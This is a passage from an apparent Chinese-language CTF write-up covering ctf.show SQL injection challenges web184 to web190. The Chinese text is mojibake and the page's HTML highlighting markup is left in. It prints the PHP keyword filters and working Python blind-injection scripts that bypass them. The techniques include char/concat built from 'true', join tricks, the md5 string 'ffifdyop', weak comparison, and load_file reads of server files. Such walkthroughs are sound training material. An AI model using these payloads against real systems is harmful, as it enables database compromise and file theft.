keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag<span class="token operator">+=</span>x            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre><h4 id="web185-trueç»•è¿‡æ•°å­—"><a href="#web185-trueç»•è¿‡æ•°å­—" class="headerlink" title="web185(trueç»•è¿‡æ•°å­—)"></a>web185(trueç»•è¿‡æ•°å­—)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>æ•°å­—è¢«banäº†</p><p><img src="web185.png" loading="lazy"></p><p><strong>æ–¹æ³•ä¸€</strong>ï¼šå¯ä»¥ä½¿ç”¨concatæ¥æ‹¼æ¥å­—ç¬¦ä¸²</p><p><img src="web185_2.png" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">formatString</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">"concat("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        tip <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">if</span> x <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>            tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tip <span class="token operator">=</span> <span class="token number">1</span>            temp <span class="token operator">+=</span> <span class="token string">"char("</span>            tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            temp <span class="token operator">+=</span> <span class="token string">"false"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            temp_d <span class="token operator">=</span> <span class="token string">"("</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                temp_d <span class="token operator">+=</span> <span class="token string">"true+"</span>            temp_d <span class="token operator">=</span> temp_d<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>            <span class="token keyword">if</span> tip <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                temp_d <span class="token operator">+=</span> <span class="token string">")"</span>            temp <span class="token operator">+=</span> temp_d        temp <span class="token operator">+=</span> <span class="token string">","</span>    temp <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>    <span class="token keyword">return</span> temp<span class="token comment"># print(formatString("0x63746673686f777b"))</span>url <span class="token operator">=</span> <span class="token string">"https://8ea77825-d310-4375-b330-8826bf8db1a3.challenge.ctf.show/select-waf.php"</span><span class="token comment"># dicçš„é¡ºåºå¯ä»¥æ”¹ä¸€ä¸‹ï¼æˆ‘æ˜¯æ‡’å¾—æ”¹äº†ï¼æ”¹é¡ºåºå¯ä»¥æé«˜æ•ˆç‡ï¼ï¼ï¼</span>dic <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass regexp(&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>formatString<span class="token punctuation">(</span>flag <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment"># print(data)</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> x            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># print("[--] &#123;&#125; is wrong".format(x))</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[flag]:"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span></code></pre><p><strong>æ–¹æ³•äºŒ</strong>ï¼šç»§ç»­ä½¿ç”¨right join</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">creatNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">"true"</span>    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>    <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">'https://16d50b32-c89c-423e-aa09-841d997cb617.challenge.ctf.show/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;&#125;,true)regexp(char(&#123;&#125;)))"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                creatNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> creatNum<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>å¢åŠ äº†å°–æ‹¬å·ï¼Œ<code>^</code>ã€<code>%</code>çš„è¿‡æ»¤ã€‚<br>ä¸Šé¢˜çš„payloadå¯ç”¨ã€‚</p><h4 id="web187-ffifdyopç»•è¿‡md5"><a href="#web187-ffifdyopç»•è¿‡md5" class="headerlink" title="web187(ffifdyopç»•è¿‡md5)"></a>web187(ffifdyopç»•è¿‡md5)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from ctfshow_user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password= '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åªæœ‰adminå¯ä»¥è·å¾—flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åä¸å­˜åœ¨'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  </code></pre><p><img src="web187.png" loading="lazy"></p><p><strong>ffifdyop||129581926211651571912466741651878684928</strong></p><p>ç»è¿‡md5åŠ å¯†åï¼š276f722736c95d99e921722cf9ed621c</p><p>å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼šâ€™orâ€™6&lt;ä¹±ç &gt; å³  <code>&#39;or&#39;66ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b</code></p><h4 id="web188-å¼±æ¯”è¾ƒ"><a href="#web188-å¼±æ¯”è¾ƒ" class="headerlink" title="web188(&#x3D;&#x3D;å¼±æ¯”è¾ƒ)"></a>web188(&#x3D;&#x3D;å¼±æ¯”è¾ƒ)</h4><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ç”¨æˆ·åæ£€æµ‹</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å¯†ç æ£€æµ‹</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'å¯†ç åªèƒ½ä¸ºæ•°å­—'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å¯†ç åˆ¤æ–­</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">=></span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    </code></pre><p>payloadæ˜¯ï¼š<code>username=0 password=0</code></p><p>åœ¨æ¯”è¾ƒæŸ¥è¯¢çš„æ—¶å€™ï¼ŒæŸ¥è¯¢è¯­å¥ä¸ºï¼š<code>select pass from ctfshow_user where username = 0 and password = 0;</code>ï¼Œç”±äº<code>username password</code>æ˜¯å­—ç¬¦ä¸²ï¼Œå¼±æ¯”è¾ƒæˆäº†0,0&#x3D;0æˆç«‹ï¼Œæ‰€æ¡ä»¶å°±æˆç«‹äº†ï¼›æœ€åæŸ¥è¯¢è¯­å¥å°±æˆäº†ï¼š<code>select pass from ctfshow_user where 1;</code></p><p>[<img src="web188.png" loading="lazy"></p><h4 id="web189-locate-load-file"><a href="#web189-locate-load-file" class="headerlink" title="web189(locate load_file)"></a>web189(locate load_file)</h4><p><strong>Hint</strong>ï¼šflagåœ¨api&#x2F;index.phpæ–‡ä»¶ä¸­</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ç”¨æˆ·åæ£€æµ‹</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å¯†ç æ£€æµ‹</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'å¯†ç åªèƒ½ä¸ºæ•°å­—'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å¯†ç åˆ¤æ–­</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   </code></pre><p>æ ¹æ®æç¤ºï¼Œå…ˆåˆ©ç”¨locateå®šä½flagçš„ä½ç½®ï¼Œç„¶åä½¿ç”¨ç›²æ³¨æ¥å¾—åˆ°flag</p><blockquote><p>LOCATE(å­—ç¬¦ä¸²1,å­—ç¬¦ä¸²2)</p><p>è¿”å›å­—ç¬¦ä¸²1åœ¨å­—ç¬¦ä¸²2ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œåªè¦å­—ç¬¦ä¸²2ä¸­åŒ…å«å­—ç¬¦ä¸²1ï¼Œé‚£ä¹ˆè¿”å›å€¼å¿…ç„¶å¤§äº0ã€‚</p></blockquote><blockquote><p>username&#x3D;0ã€password&#x3D;0æ—¶ï¼Œè¿”å›â€œå¯†ç é”™è¯¯â€ã€‚ï¼ˆè¯´æ˜å­˜åœ¨ç”¨æˆ·ï¼Œä½†æ˜¯å¯†ç é”™è¯¯ï¼‰<br>username&#x3D;1ã€password&#x3D;0æ—¶ï¼Œè¿”å›â€œæŸ¥è¯¢å¤±è´¥â€ã€‚ï¼ˆè¯´æ˜ç”¨æˆ·ä¸å­˜åœ¨ï¼‰</p></blockquote><p>å¯ä»¥åˆ©ç”¨ä»¥ä¸Šè¿”å›æƒ…å†µæ¥è¿›è¡Œifé€å­—ç¬¦ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://deb43701-a2f5-42bf-817a-f374b486bcdf.challenge.ctf.show/api/'</span><span class="token keyword">def</span> <span class="token function">getFlagIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">1</span>    tail <span class="token operator">=</span> <span class="token number">300</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(locate('ctfshow&#123;',"</span> <span class="token operator">+</span> <span class="token string">"load_file('/var/www/html/api/index.php'))>&#123;&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">return</span> mid<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        head <span class="token operator">=</span> <span class="token number">32</span>        tail <span class="token operator">=</span> <span class="token number">127</span>        <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(ascii(substr(load_file('/var/www/html/api/index.php'),&#123;0&#125;,1))>&#123;1&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>            <span class="token punctuation">&#125;</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                tail <span class="token operator">=</span> mid            <span class="token comment"># mid += 1</span>        <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    mid <span class="token operator">=</span> getFlagIndex<span class="token punctuation">(</span><span class="token punctuation">)</span>    getFlag<span class="token punctuation">(</span>mid<span class="token punctuation">)</span></code></pre><p>è¿˜æœ‰ä¸€ä¸ªæ²¡æœ‰é‡‡ç”¨äºŒåˆ†ç®—æ³•çš„</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://dc02940d-e22b-4796-ab0f-04bdf57d3a9f.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">"&#125;&#123;&lt;>$=,;_ 'abcdefghijklmnopqr-stuvwxyz0123456789"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token comment">#è¿™ä¸ªä½ç½®ï¼Œæ˜¯ç¾¤ä¸»è€—è´¹å¾ˆé•¿æ—¶é—´è·‘å‡ºæ¥çš„ä½ç½®~</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">257</span><span class="token punctuation">,</span><span class="token number">257</span><span class="token operator">+</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"if(substr(load_file('/var/www/html/api/index.php'),&#123;&#125;,1)=('&#123;&#125;'),1,0)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token comment"># 8d25æ˜¯username=1æ—¶çš„é¡µé¢è¿”å›å†…å®¹åŒ…å«çš„ï¼Œå…·ä½“å¯ä»¥çœ‹ä¸Šé¢çš„æˆªå›¾~</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8d25"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++ &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>flag<span class="token operator">+=</span>x<span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">continue</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><h4 id="web190-å¸¸è§„bool-blind"><a href="#web190-å¸¸è§„bool-blind" class="headerlink" title="web190(å¸¸è§„bool blind)"></a>web190(å¸¸è§„bool blind)</h4><p>è¾“å…¥ admin&#x2F;123 è¾“å‡ºå¯†ç é”™è¯¯</p><p>è¾“å…¥ test&#x2F;123 è¾“å‡ºç”¨æˆ·åä¸å­˜åœ¨</p><p>è¯´æ˜å­˜åœ¨è´¦å· admin</p><hr><p>è¾“å…¥ adminâ€™ and 1&#x3D;1 # è¾“å‡ºå¯†ç é”™è¯¯</p><p>è¾“å…¥ adminâ€™ and 